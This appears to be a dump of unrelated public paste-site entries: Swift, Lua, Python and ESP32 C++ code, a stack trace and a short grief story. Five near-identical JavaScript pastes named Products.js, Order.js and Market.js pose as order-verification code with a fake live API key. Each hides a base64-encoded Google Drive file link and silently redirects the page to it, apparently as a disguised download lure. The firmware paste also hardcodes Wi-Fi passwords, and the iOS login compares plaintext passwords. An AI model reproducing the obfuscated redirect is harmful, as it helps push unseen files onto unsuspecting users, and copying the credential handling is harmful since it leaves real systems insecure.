502"",""stackTrace"":[{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":401,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":87,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1085,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":450,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1167,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":641,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":923,""methodName"":""run""}],""suppressedExceptions"":[]}"
sGNsP7xh,IOS Dynamic Login,stronk_8s,Swift,Friday 11th of April 2025 10:33:15 AM CDT,"
import UIKit
import CoreData

class ViewController: UIViewController {
    @IBOutlet weak var username: UITextField!
    @IBOutlet weak var password: UITextField!
    var user : UserTbl?
    var users :[UserTbl]=[]
    override func viewDidLoad() {
        
        super.viewDidLoad()
        let dirpath = NSSearchPathForDirectoriesInDomains(.documentDirectory, .userDomainMask, true )
        print(dirpath[0]
    }

    @IBAction func btnLogin(_ sender: UIButton) {
        let appDel = UIApplication.shared.delegate as! AppDelegate
        let moc = appDel.persistentContainer.viewContext
        let fr = NSFetchRequest<UserTbl>(entityName: ""UserTbl"")

        //fetch all user
        do{
            users = try moc.fetch(fr)
        }
        catch{
            print(NSError.self)
        }

        //validate all user using for loop
        for user in users {
            if username.text == user.username && password.text == user.password{
                navigate()
            }
            else{
                print(""Error"")
            }
        }
        
    }
    
    func navigate(){
        let next = storyboard?.instantiateViewController(withIdentifier: ""cat"") as! CategoryViewController
        navigationController?.pushViewController(next, animated: true)
    }
    
}

"
xfrzwAtg,Untitled,dentira,JavaScript,Friday 11th of April 2025 10:29:41 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/79804/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
iJxer6U0,ChatGPT's well digger,MarcPino,Lua,Friday 11th of April 2025 10:27:35 AM CDT,"----------------------------------------------------------------
-- Script pour creuser un puits vertical (CC:Tweaked) de dimensions X par Y
-- Zone de creusage de [1,0,-1] à [1+X, Y, bedrock]
-- Auto-dumping et auto-refuel uniquement lorsque l'inventaire est presque plein.
--
-- Hypothèses :
-- - La Turtle démarre en [0,0,0], face +X.
-- - Un coffre est à gauche ([0,-1,0]) pour le dump (sauf items ""coal"" ou ""charcoal"").
-- - Un coffre est à droite ([0,1,0]) pour le re‑fuel (contenant du coal ou charcoal).
----------------------------------------------------------------

-- Variables de suivi de position et orientation
local pos = {x = 0, y = 0, z = 0}
-- Orientations : 0 = est (+X), 1 = nord (+Y), 2 = ouest (-X), 3 = sud (-Y)
local facing = 0

-------------------------------------------------
-- Fonctions de mise à jour de la position et rotation
-------------------------------------------------
local function updatePos(dx, dy, dz)
  pos.x = pos.x + dx
  pos.y = pos.y + dy
  pos.z = pos.z + dz
end

local function turnLeft()
  turtle.turnLeft()
  facing = (facing + 1) % 4
end

local function turnRight()
  turtle.turnRight()
  facing = (facing + 3) % 4
end

local function turnAround()
  turnLeft()
  turnLeft()
end

-------------------------------------------------
-- Fonctions de déplacement avec creusage si besoin
-------------------------------------------------
local function forward()
  while not turtle.forward() do
    if turtle.detect() then
      turtle.dig()
    else
      sleep(0.5)
    end
  end
  if facing == 0 then updatePos(1,0,0)
  elseif facing == 2 then updatePos(-1,0,0)
  elseif facing == 1 then updatePos(0,1,0)
  elseif facing == 3 then updatePos(0,-1,0)
  end
end

local function up()
  while not turtle.up() do
    if turtle.detectUp() then turtle.digUp() else sleep(0.5) end
  end
  updatePos(0,0,1)
end

local function down()
  while not turtle.down() do
    if turtle.detectDown() then turtle.digDown() else sleep(0.5) end
  end
  updatePos(0,0,-1)
end

-------------------------------------------------
-- Déplacement vers une destination donnée
-- On déplace d'abord en X, puis en Y, enfin en Z
-------------------------------------------------
local function faceDirection(targetDir)
  local diff = (targetDir - facing) % 4
  if diff == 1 then
    turnLeft()
  elseif diff == 2 then
    turnAround()
  elseif diff == 3 then
    turnRight()
  end
end

local function goTo(targetX, targetY, targetZ)
  -- Déplacement en X
  local dx = targetX - pos.x
  if dx ~= 0 then
    if dx > 0 then
      faceDirection(0)
      for i = 1, math.abs(dx) do forward() end
    else
      faceDirection(2)
      for i = 1, math.abs(dx) do forward() end
    end
  end
  -- Déplacement en Y
  local dy = targetY - pos.y
  if dy ~= 0 then
    if dy > 0 then
      faceDirection(1)
      for i = 1, math.abs(dy) do forward() end
    else
      faceDirection(3)
      for i = 1, math.abs(dy) do forward() end
    end
  end
  -- Déplacement en Z
  local dz = targetZ - pos.z
  if dz > 0 then
    for i = 1, dz do up() end
  elseif dz < 0 then
    for i = 1, -dz do down() end
  end
end

-------------------------------------------------
-- Gestion de l'inventaire : dump et refuel
-------------------------------------------------
local function dumpInventory()
  print(""Dump de l'inventaire..."")
  -- Se tourner vers la gauche (coffre de dump)
  faceDirection(1)
  turtle.forward()  -- Aller dans le coffre
  for slot = 1, 16 do
    local item = turtle.getItemDetail(slot)
    if item then
      -- Conserver les items de fuel (coal/charcoal)
      if not (string.find(item.name, ""coal"") or string.find(item.name, ""charcoal"")) then
        turtle.select(slot)
        turtle.drop() 
      end
    end
  end
  turtle.select(1)
  turnAround()
  while not turtle.forward() do sleep(0.5) end
  faceDirection(0)
end

local function refuelIfNeeded()
  if turtle.getFuelLevel() == ""unlimited"" then return end
  local fuelLevel = turtle.getFuelLevel()
  if fuelLevel < 100 then  -- Seuil modifiable selon les besoins
    print(""Fuel insuffisant (""..fuelLevel..""). Refuel en cours..."")
    faceDirection(3)  -- se tourner vers la droite
    turtle.forward()  -- Aller dans le coffre de fuel
    for i = 1, 16 do turtle.suck() end
    for slot = 1, 16 do
      turtle.select(slot)
      turtle.refuel()
    end
    turtle.select(1)
    turnAround()
    while not turtle.forward() do sleep(0.5) end
    faceDirection(0)
  end
end

-------------------------------------------------
-- Retour à la base pour dump et refuel, avec possibilité de reprendre à une position donnée
-------------------------------------------------
local function returnToStart(resumeX, resumeY, resumeZ)
  print(""Retour au point de départ pour dump & refuel..."")
  goTo(0,0,0)
  dumpInventory()
  refuelIfNeeded()
  if resumeX and resumeY and resumeZ then
    goTo(resumeX, resumeY, resumeZ)
  end
end

-------------------------------------------------
-- Fonction utilitaire pour vérifier si l'inventaire est presque plein
-------------------------------------------------
local function inventoryAlmostFull(threshold)
  local freeSlots = 0
  for slot = 1, 16 do
    if not turtle.getItemDetail(slot) then
      freeSlots = freeSlots + 1
    end
  end
  return freeSlots < threshold
end

-------------------------------------------------
-- Excavation d'une couche horizontale de la zone
-- La zone est balayée en zigzag et, à chaque déplacement,
-- on vérifie que l'inventaire n'est pas presque plein.
-------------------------------------------------
local function digLayer(X, Y)
  -- La zone de creusage commence en [1,0] (plan local)
  for j = 0, Y - 1 do
    for i = 1, X do
      -- Creuser le bloc situé en dessous s'il est présent
      while turtle.detectDown() do
        turtle.digDown()
        sleep(0.2)
      end
      
      if i < X then
        forward()
        -- Vérifier l'inventaire après un déplacement
        if inventoryAlmostFull(3) then
          print(""Inventaire presque plein au niveau de la couche. Dump en cours..."")
          local resumeX, resumeY, resumeZ = pos.x, pos.y, pos.z
          returnToStart(resumeX, resumeY, resumeZ)
        end
      end
    end
    -- Si ce n'est pas la dernière rangée, passer à la rangée suivante en zigzag
    if j < Y - 1 then
      if (j % 2 == 0) then
        turnRight()
        forward()
        turnRight()
      else
        turnLeft()
        forward()
        turnLeft()
      end
      if inventoryAlmostFull(3) then
        print(""Inventaire presque plein entre les rangées. Dump en cours..."")
        local resumeX, resumeY, resumeZ = pos.x, pos.y, pos.z
        returnToStart(resumeX, resumeY, resumeZ)
      end
    end
  end
  -- Repositionnement pour revenir au coin de départ de la couche
  if (Y % 2 == 0) then
    faceDirection(2)
    for i = 1, X - 1 do forward() end
  end
end

-------------------------------------------------
-- Vérification de la présence de bedrock en dessous
-------------------------------------------------
local function isBedrockBelow()
  local success, data = turtle.inspectDown()
  if success and data.name == ""minecraft:bedrock"" then
    return true
  end
  return false
end

-------------------------------------------------
-- Programme principal
-------------------------------------------------
local function main()
  if #arg < 2 then
    print(""Usage: lua well.lua <X> <Y>"")
    return
  end

  local X = tonumber(arg[1])
  local Y = tonumber(arg[2])
  if not X or not Y then
    print(""Dimensions invalides."")
    return
  end

  print(""Début de l'excavation d'un puits de dimension ""..X..""x""..Y)
  
  -- Se positionner au coin en haut à gauche de la zone de creusage
  goTo(1, 0, 0)
  -- Descendre d'une case pour commencer à la couche z = -1
  down()

  local layer = 1
  while true do
    print(""Creusage de la couche ""..layer.."" (z = ""..pos.z.."")"")
    digLayer(X, Y)
    
    -- Vérifier si le bedrock est présent sous la couche actuelle
    if isBedrockBelow() then
      print(""Bedrock détecté. Fin de l'excavation."")
      break
    end
    
    -- Fin de la couche : retourner au point de départ pour dump/refuel si nécessaire
    returnToStart()
    goTo(1, 0, pos.z)
    down()
    layer = layer + 1
  end

  returnToStart()
  print(""Puits terminé en profondeur ""..(-pos.z).."" blocs."")
end

main()"
ADMsKWNC,Products.js,dentira,JavaScript,Friday 11th of April 2025 10:14:18 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/77515/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
uFSW8nPg,2214b2e5-fc19-4d11-96aa-54c58a864f18,Jexal,Python,Friday 11th of April 2025 10:03:21 AM CDT,"""""""This script allows you to save URLs from a specified text file to Archive.ph.""""""

import logging
import re
import time
import webbrowser
import subprocess
from os import system
from colorama import Fore, Style, init
from rich.traceback import install

# ----------------------- Initialization -----------------------
system(""title "" + ""Archive.ph Link Saver"")
init(autoreset=True)
install()

# ----------------------- Config -----------------------
DELAY_BETWEEN_URLS = 5  # Delay between URL submissions
URL_INPUT_PATH = r""C:\Scripts\Archive.ph Link Saver\URLs.txt""
MODIFIED_URLS_PATH = r""C:\Scripts\Archive.ph Link Saver\Logs\Newly Modified URLs.txt""
LOG_FILE_PATH = r""C:\Scripts\Archive.ph Link Saver\Logs\Archive.ph.log""

# ----------------------- Logging Setup -----------------------
logging.basicConfig(filename=LOG_FILE_PATH,
                    level=logging.DEBUG,
                    format='%(asctime)s - %(levelname)s - %(message)s')

logging.info(""Script started"")


# ----------------------- Regex Pattern -----------------------
general_url_pattern = re.compile(
    r'^(https?://)?'  # optional http or https
    r'(www\.)?'       # optional www.
    r'([a-zA-Z0-9]+(-[a-zA-Z0-9]+)*\.)+'  # domain name
    r'[a-zA-Z]{2,}'   # TLD
    r'(/[a-zA-Z0-9-._~%!$&\'()*+,;=]*)*'  # optional path
    r'(\?[a-zA-Z0-9-._~%!$&\'()*+,;=]*)?'  # optional query
    r'(#.*)?$'  # optional fragment
)


# ----------------------- Utility -----------------------
def log_and_print(message, level=""info"", color=None):
    getattr(logging, level)(message)
    print((color or """") + message)


# ----------------------- Main Function -----------------------
def main():
    invalid_urls = False
    archive_base = ""https://archive.ph/?run=1&url=""

    try:
        with open(URL_INPUT_PATH, ""r"") as input_file, open(MODIFIED_URLS_PATH, ""w"") as output_file:
            count = 1
            for line in input_file:
                url = line.strip()
                if not url:
                    log_and_print(""Skipped empty line"", ""info"")
                    continue

                if general_url_pattern.match(url):
                    new_url = f""{archive_base}{url}""
                    output_file.write(new_url + ""\n"")
                    log_and_print(f""Saved URL #{count}: {new_url}"", ""info"")
                    webbrowser.open(new_url)
                    log_and_print(f""> Saving URL #{count}"", color=Fore.YELLOW)
                    time.sleep(DELAY_BETWEEN_URLS)
                    count += 1
                else:
                    log_and_print(f""> Invalid URL: {url}"", level=""warning"", color=Fore.RED + Fore.LIGHTCYAN_EX)
                    invalid_urls = True

    except FileNotFoundError as e:
        log_and_print(f""Error: {e}"", level=""error"", color=Fore.RED)
        return

    if invalid_urls:
        log_and_print(""> Some URLs were invalid and not saved."", level=""warning"", color=Fore.YELLOW)
        input(f""> Press {Fore.YELLOW}Enter{Style.RESET_ALL} to exit and open the {Fore.YELLOW}URLs{Style.RESET_ALL} text file..."")
        subprocess.Popen([""notepad.exe"", URL_INPUT_PATH])
    else:
        log_and_print(""> All URLs are being saved."", color=Fore.GREEN)

    time.sleep(1)
    clean_trailing_newline(MODIFIED_URLS_PATH)
    logging.info(""Script completed"")


# ----------------------- Trailing Newline Cleanup -----------------------
def clean_trailing_newline(path):
    try:
        with open(path, ""r+"") as file:
            data = file.read().rstrip('\n')
            file.seek(0)
            file.write(data)
            file.truncate()
        logging.info(""Removed empty line at the end of the output file"")
    except Exception as e:
        log_and_print(f""Error cleaning file: {e}"", level=""error"", color=Fore.RED)


# ----------------------- Entrypoint -----------------------
if __name__ == ""__main__"":
    main()
"
2pLgfQq9,Order.js,dentira,JavaScript,Friday 11th of April 2025 09:58:56 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/70357/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
RLCkh7EA,Market.js,dentira,JavaScript,Friday 11th of April 2025 09:43:12 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/75383/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
EnpGqecv,Melice,daUnknownCoder,Bash,Friday 11th of April 2025 09:35:30 AM CDT,"daUnknownGuy:
a voice echoed in her head go on melice, im still looking at you from above... find the one who loves you more than i did... the one who deserves you better... and stop coming to the graveyard... move on melice, i want you to be happy melice... and you promised to not do cigarettes... move on... find someone... the world is a big place... there willl be atleast one person in this world who will love you more than i did, who will make you love him more than you did... and accept the new love... and forget me... his voice faded

Melice:
Melice froze, the words echoing in her mind like heaven’s own voice. Fred’s voice, so tender, so full of the love he’d never failed to give her, not ordering, but begging. Begging her to live, breathe, stop drowning in the ocean of her own grief. She stood there, with the weight of his words pressed down upon her, heavier than anything she’d ever felt before.

This is just my mind. A hallucination. A trick of grief. But the conviction in those words… the way they wrapped around her like his arms once had… she couldn’t deny how desperately she wanted them to be true.

She turned toward his headstone, her hands trembling as they reached out to touch the cold marble. ""Are you really here?"" she whispered, her voice cracking. ""Or am I just losing my mind?""

No answer came, but the autumn wind stirred, carrying the scent of rain and fallen leaves—a smell she’d always associated with him, that first day they’d met under the willow tree, their laughter blending with the scent of damp earth.

Go on, Melice… I want you to be happy…

The words replayed in her mind like a mantra, and suddenly, without warning, Melice sank to her knees, her hands gripping fistfuls of the grass. ""How do I move on?"" she pleaded, her voice raw. ""How do I stop loving you? You’re in everything—the way the sunlight filters through the trees, the sound of rain on the roof, the stupid habit you had of humming off-key when you were sad…""

Her voice broke, tears spilling over as she laughed through the sobs. ""You were… you were everything to me. How do I just… let go?""

""Okay,"" she whispered, her voice steadier now. ""Okay, Fred. I’ll… I’ll try.""

Standing once more, Melice took one final look at the grave. She didn’t cry. Didn’t scream. Just stared, as though memorizing every detail—the way the light caught the edges of the stone, the faint engraving of Fred’s name, until it seared itself into her memory for all eternity.

""Thank you,"" she said softly, tears finally streaming down her face now, but different somehow. Lighter. Almost hopeful. ""For everything. For loving me so much. But it’s time… time for me to let you go.""

She turned to leave, her steps faltering as she fought the urge to glance back. But as she walked, a faint breeze carried the scent of rain and willow trees and him, and for the first time in months, her heart didn’t shatter. It ached, yes. But it also felt… lighter.

She walked on, into the light, and somewhere beyond the graveyard, a new chapter waited—one Fred had demanded she open, even from beyond the veil. And as she stepped into it, Melice knew she’d carry him with her always… but no longer let him define her life.
"
uT72kG5N,Untitled,dentira,JavaScript,Friday 11th of April 2025 09:27:51 AM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/58937/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
5D5gRZt5,2,GaabMM88,C++,Friday 11th of April 2025 09:17:05 AM CDT,"int stacount = 0;
const char compile_date[] = __DATE__;
//Included with the name printing
#include <HardwareSerial.h>
#include ""AiEsp32RotaryEncoder.h""
#include ""Arduino.h""
#include ""Wire.h""
#include <Adafruit_NeoPixel.h>
#include <esp_task_wdt.h>
#include <WiFi.h>
//#include <RTClib.h>
#include <ErriezDS3231.h>
#include ""PinDefinitionsAndMore.h""  // Define macros for input and output pin etc.
#include <IRremote.hpp>
#include ""TC74.h""

#define sense1 2000
#define sense2 2050
#define ROTARY_ENCODER_A_PIN 35
#define ROTARY_ENCODER_B_PIN 32
#define ROTARY_ENCODER_BUTTON_PIN 33
#define ROTARY_ENCODER_VCC_PIN -1 /* 27 put -1 of Rotary encoder Vcc is connected directly to 3,3V; else you can use declared output pin for powering rotary encoder */
#define ROTARY_ENCODER_STEPS 4
#define powerSW 13
#define inputSW
#define dcSenseRight 19  //-> pin / dcErrorRight (current state) / dcErroRightLast (last state of dcErrorRight)
#define dcSenseLeft 18   //-> pin / dcErrorLeft (current state) / dcErrorLeftLast (last state of dcErrorLeft)
#define acSense 5        //-> pin / acError (current state) / acErrorLast (last state of acError)
#define pwr 16           // Standby relay
#define speaker 17       // Speaker relay
#define WS2812 2         // WS2812 pin
#define NUMPIXELS 8      // number of LED
#define LDR 12           // LDR pin
#define RXN_PIN 26       // Serial1 RX to Nextion TX
#define TXN_PIN 25       // Serial1 TX to Nextion RX
#define RX_PIN 27        // Serial2 RX a Amp TX
#define TX_PIN 14        // Serial2 TX a Amp RX
#define SDA 21           // I2C Thermometer, Expander, etc.
#define SCL 22

#define boot 0  // Nextion page number 0..11
#define standby 1
#define main 2
#define digiSetup 3
#define ampSetup 4
#define digiInput 5
#define digiPreset 6
#define dsp1 7
#define dsp2 8
#define dsp3 9
#define info 10
#define dataRecord 11

#define DATE_STRING_SHORT 3
#define ONs 1
#define OFFs 0

//RTC_DS3231 rtc;
ErriezDS3231 rtc;
TC74 tmp1(0x4A);         //A2 Address
TC74 tmp2(0x4B);         //A3 Address
HardwareSerial uart(2);  // Uso de la interfaz de hardware Serial2
Adafruit_NeoPixel pixels(NUMPIXELS, WS2812, NEO_RGB + NEO_KHZ800);
AiEsp32RotaryEncoder rotaryEncoder = AiEsp32RotaryEncoder(ROTARY_ENCODER_A_PIN, ROTARY_ENCODER_B_PIN, ROTARY_ENCODER_BUTTON_PIN, ROTARY_ENCODER_VCC_PIN, ROTARY_ENCODER_STEPS);

// Month names in flash
const char monthNames_P[] PROGMEM = ""JanFebMarAprMayJunJulAugSepOctNovDec"";
// Day of the week names in flash
const char dayNames_P[] PROGMEM = ""SunMonTueWedThuFriSat"";

const int powerOffDelayForRelay = 400;  //in millis seconds
//const byte LDR = 12;                //Light Dependant Resistor
const long eventTime_1_LDR = 5000;  //check brigtness in ms
unsigned long previousTime_1 = 0, beepMillis = 0, protectMillis = 0, irMillis = 0, irVolMillis, strengthMillis = 0, lastMillis = 0;
unsigned long ac_time = 0, ac_time_last = 0;
boolean powerState = 0, lastPowerState = 0, nextionSetTimebit = 1;
int offset = 2, beep = 0, NextionPage = 0;
int digiVolume = 0, dmute = 0, lastPressed = 0, source = 0, dim = 0, dimN = -1, task = 0;
int initDigi = 1, toDigi = 1;
int dcErrorRight = 1, dcErrorRightLast = -1, dcErrorLeft = 1, dcErrorLeftLast = -1, acError = 1, acErrorLast = -1;  //variables for protection

int debug = 1;  //1 - writing all data; 2 - only protection data

int ac_protect = 0;
int self_test = 0;
int currentPage = -1;  // current page of nextion
int irLastCode = -1;
int volStep = 2;
int sourceS = 0;
int devState = 1;
int speaker1timeon;
unsigned long speakerMillis;
String sReceived, nReceived;
int ev, honap, nap, ora, perc, mperc, hetnapja;  //These are where we store the RTC values.
int speakerRelayEnable, speakerRelaySet, pwrRelayEnable, pwrRelaySet;
int protectionErrors;

void readProtection();
void i2cCheck();

#if (1)
const char* ssid = ""TP-Link_F072"";
const char* password = ""12778072"";
#else
const char* ssid = ""SirRouter"";
const char* password = ""19801989"";
#endif

struct s_last {
  int acError;
  int dcErrorLeft;
  int dcErrorRight;
} last;

struct s_timer {

  unsigned long protectionOffDelay;   //in the readProtection, off delay
}timer;

struct s_i2cdev {
  String name;
  int address;
  int state;
  String stateStr;
};
s_i2cdev tc74_1;
s_i2cdev tc74_2;
s_i2cdev rtcModule;
s_i2cdev rtcEEPROM;
s_i2cdev dspModule;
s_i2cdev dspEEPROM;

class c_RelayClass {
public:
  int speakerEnable;
  int powerEnable;
  // CLASS
  void spk(int set) {  // send SPK relay state
    if (speakerEnable == 1) {
      Serial.print(""Speakers is: "" + set);
      if (set) {
        Serial.println("" ON"");
      } else {
        Serial.println(""OFF"");
      }
      digitalWrite(speaker, set);
    } else {
      digitalWrite(speaker, LOW);
    }
  }

  void power(int set) {  // send SPK pwr state
    if (powerEnable == 1) {
      Serial.print(""Main relay is: "" + set);
      if (set) {
        Serial.println("" ON"");
      } else {
        Serial.println(""OFF"");
      }
      digitalWrite(pwr, set);
    } else {
      digitalWrite(pwr, LOW);
    }
  }
} relays;

class c_NextionWrite {
public:
  void init(int speed, int RXN, int TXN) {
    Serial1.begin(speed, SERIAL_8N1, RXN, TXN);
    // if (debug) Serial.printf(""Serial1 - Speed: %d, RX-pin: %d, TX-pin: %d \n"", speed, RX, TX);
  }
  void txt(String Name, String text) {
    Serial1.print(Name + "".txt=\"""" + text + ""\""\xFF\xFF\xFF"");
    if (debug == 1) Serial.println(Name + "".txt=\"""" + text + ""\""\xFF\xFF\xFF"");
  }
  void val(String Name, int value) {
    Serial1.print(Name + "".val="" + String(value) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(Name + "".val="" + String(value) + ""\xFF\xFF\xFF"");
  }
  void systemVal(String Name, int value) {
    Serial1.print(Name + ""="" + String(value) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(Name + ""="" + String(value) + ""\xFF\xFF\xFF"");
  }
  void pageChange(int Name) {
    Serial1.print(""page "" + String(Name) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(""page "" + String(Name) + ""\xFF\xFF\xFF"");
    //Serial.println(""EPG"");
    NextionPage = Name;
  }
  void setPco(String name, int pco) {  // for global variable need a page number / page name too
    Serial1.print(name + "".pco="" + String(pco) + ""\xFF\xFF\xFF"");
    if (debug == 1) Serial.print(name + "".pco="" + String(pco) + ""\xFF\xFF\xFF"");
  }
  void timerEnable(String name, int en) {
    Serial1.print(name + "".en="" + String(en) + ""\xFF\xFF\xFF"");
  }
  void vis(String name, int en) {
    Serial1.print(""vis "" + name + "","" + String(en) + ""\xFF\xFF\xFF"");
  }
  void dim(int en) {
    Serial1.print(""dim="" + String(en) + ""\xFF\xFF\xFF"");
  }
  void touchSet(String name, int en) {  //nextion.touchSet(""preset"", 0/1);
    Serial1.print(""tsw "" + String(name) + "","" + String(en) + ""\xFF\xFF\xFF"");
  }
  void click(String name, int en) {
    Serial.print(""click "" + String(name) + "","" + en + ""\xFF\xFF\xFF"");
    Serial1.print(""click "" + String(name) + "","" + en + ""\xFF\xFF\xFF"");
  }
  void setTime(int ev, int honap, int nap, int ora, int perc, int mperc, int hetnapja) {
    //hour = (hour + 24) % 24;
    Serial1.print(""rtc0="" + String(ev) + ""\xFF\xFF\xFF"");     //year
    Serial1.print(""rtc1="" + String(honap) + ""\xFF\xFF\xFF"");  //month
    Serial1.print(""rtc2="" + String(nap) + ""\xFF\xFF\xFF"");    //day
    Serial1.print(""rtc3="" + String(ora) + ""\xFF\xFF\xFF"");    //hour
    Serial1.print(""rtc4="" + String(perc) + ""\xFF\xFF\xFF"");   //minute
    Serial1.print(""rtc5="" + String(mperc) + ""\xFF\xFF\xFF"");  //second
    // Serial1.print(""rtc6="" + String(hetnapja) + ""\xFF\xFF\xFF""); //days of the Week
    Serial.printf(""Nextion time/ hour: %d min: %d sec: %d \n"", ora, perc, mperc);
    Serial.println(""--------------------"");
  }
};
c_NextionWrite nextion;

class c_power {
public:
  int state = 0;
  int lastState;
  void on() {
    state = ONs;
    relays.power(ONs);
    while (protectionErrors) {
      readProtection();
    }
    relays.spk(ONs);
    nextion.pageChange(main);
  }

  int firstInitial() {
    nextion.val(""vaMCU"", 0);
    nextion.val(""boot.vaSupply"", 0);
    nextion.val(""boot.vaProtection"", 0);
    nextion.val(""vaRTC"", 0);
    nextion.val(""vaArylic"", 0);
    if (debug == 3) {
      Serial.printf(""Initial check\n"");
    }
    //-----
    while (state == 0) {  //Nextion <-> ESP32 communication check
